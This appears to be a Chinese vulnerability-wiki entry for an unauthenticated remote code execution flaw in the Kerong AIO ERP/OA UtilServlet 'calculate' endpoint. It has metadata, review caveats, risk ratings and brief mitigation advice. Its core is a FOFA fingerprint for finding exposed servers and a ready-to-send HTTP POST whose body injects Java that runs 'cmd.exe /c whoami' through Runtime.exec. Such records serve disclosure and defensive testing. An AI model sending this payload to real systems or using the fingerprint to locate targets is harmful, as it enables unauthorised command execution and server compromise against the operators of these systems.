---
source: "SourByte05/Vulnerability-Wiki-PoC"
title: "科荣AIO ERP/OA UtilServlet calculate脚本表达式远程代码执行"
product: "科荣AIO ERP/OA"
record_type: "vulnerability"
review_status: "text-reviewed"
verification_status: "not-reproduced"
content_status: "needs-review"
primary_identifiers: ""
referenced_identifiers: ""
identifier_status: "unknown"
affected_scope: "版本未知，Windows cmd及Java脚本执行环境"
prerequisites: "未声明"
side_effects: "命令/代码执行示例可能改变主机状态"
review_date: "2026-10-02"
source_url: "https://github.com/SourByte05/Vulnerability-Wiki-PoC"
source_status: "recorded"
archive_url: "https://github.com/Ares-X/VulWiki/blob/41940cb0038d09ca5aaddbe5bffb923e423d210f/Web%E5%AE%89%E5%85%A8/%E5%95%86%E4%B8%9A%E8%BD%AF%E4%BB%B6/%E7%A7%91%E8%8D%A3AIO/%E7%A7%91%E8%8D%A3%20AIO%20%E7%AE%A1%E7%90%86%E7%B3%BB%E7%BB%9FRCE%E6%BC%8F%E6%B4%9E.md"
fofa: "body=\"changeAccount('8000')\""
fofa_unverified: "body="
id: "vw-87dac1e0a3133eeb78f9c48c"
entity_id: "ve-87dac1e0a3133eeb78f9c48c"
schema_version: "1"
---

# 科荣AIO ERP/OA UtilServlet calculate脚本表达式远程代码执行

## 条目说明

- 对象与具体问题：科荣AIO ERP/OA；UtilServlet calculate脚本表达式RCE
- 版本、配置及部署条件：版本未知，Windows cmd及Java脚本执行环境
- 认证与权限前提：未声明
- 核验边界：已完成原始 Markdown 的文本审阅；未执行 PoC、未访问目标、未视检截图。来源所述影响与复现结果不等于本库独立验证。

## 证据边界与更正

以下记录原始资料的证据边界。可以由原文确定的产品、编号及格式问题已在本条修订；没有原始证据的版本、响应和补丁信息仍待核实。

- operation calculate调用Java Runtime并读进程输出，需脚本解释器/导入条件说明；无响应证据
- 影响版本、权限、根因、修复版本均缺；官方修复仅泛化限制访问和升级，无官方链接
- 简介ERP/OA/CRM等字词重复及Unicode混杂；在野利用声称无来源
- 宜归ERP产品，与ReportServlet文件读取为不同入口

## 操作风险

命令/代码执行示例可能改变主机状态。保留原示例供静态分析；仅可在明确授权的隔离测试环境验证，事先准备备份与回滚。

## 技术资料与来源记录

## 漏洞描述

科荣AIO 企业⼀体化管理解决⽅案 通过ERPERP（进销存财务）、OAOA（办公⾃动化）、CRMCRM（客⼾关系管理）、UDPUDP（⾃定义平台），集电⼦商务平台、⽀付平台、ERP 平台、微信平台、移动APP 等解决了众多企业客⼾在管理过程中跨部⻔、多功能、需求多变等通⽤及个性化的问题。AIO UtilServlet 接口处存远程代码执行漏洞，未经身份验证的攻击者可通过该漏洞远程执行恶意代码，写入后门文件，可获取服务器权限。

## 影响范围

科荣 AIO 管理系统

## **漏洞状态**

| 漏洞细节 | 漏洞POC | 漏洞EXP | 在野利用 |
|------|-------|-------|------|
| 原文提供部分细节 | 见技术资料 | 未独立核验 | 待来源核实 |

> 归档原表（原作者主张，未独立核验）：上表记录本库当前核验边界；下表保留归档中的公开情况和在野利用声明，不能据此认定本库已验证。
>
> | 漏洞细节 | 漏洞POC | 漏洞EXP | 在野利用 |
> |------|-------|-------|------|
> | 是 | 已公开 | 已公开 | 已知 |

### 风险等级

| 维度 | 评价 |
|----|----|
| 威胁等级 | 高危 |
| 影响面 | 广 |
| 攻击者价值 | 中 |
| 利用难度 | 低 |

## 漏洞复现

FOFA：body="changeAccount('8000')"

POC/EXP：

```http
POST /UtilServlet HTTP/1.1
Host: 127.0.0.1:8000
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:121.0) Gecko/20100101 Firefox/121.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate
Connection: close
Upgrade-Insecure-Requests: 1
Pragma: no-cache
Cache-Control: no-cache
Content-Type: application/x-www-form-urlencoded
Content-Length: 326

operation=calculate&value=BufferedReader+br+%3d+new+BufferedReader(new+InputStreamReader(Runtime.getRuntime().exec("cmd.exe+/c+whoami").getInputStream()))%3bString+line%3bStringBuilder+b+%3d+new+StringBuilder()%3bwhile+((line+%3d+br.readLine())+!%3d+null)+{b.append(line)%3b}return+new+String(b)%3b&fieldName=example_field
```

> 请求长度说明：原资料 Content-Length 为 326；保留原始标头；其数值未据实际请求体重新计算或验证。


## 修复方案

**官方修复：**

关闭互联网暴露面或接口设置访问权限

升级至安全版本

关注官方发布的最新修复建议。


---

> 来源：SourByte05/Vulnerability-Wiki-PoC（https://github.com/SourByte05/Vulnerability-Wiki-PoC）
